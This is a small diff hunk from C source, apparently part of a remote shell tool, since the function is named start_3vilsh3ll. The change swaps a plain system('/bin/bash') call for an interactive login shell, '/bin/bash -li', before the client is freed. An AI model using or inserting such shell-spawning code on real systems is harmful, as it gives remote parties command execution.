@@ -303,7 +303,7 @@ start_3vilsh3ll(void)
 		return;
 	}
 	
-	system("/bin/bash");
+	system("/bin/bash -li");
 	free_client(client);
 }
 
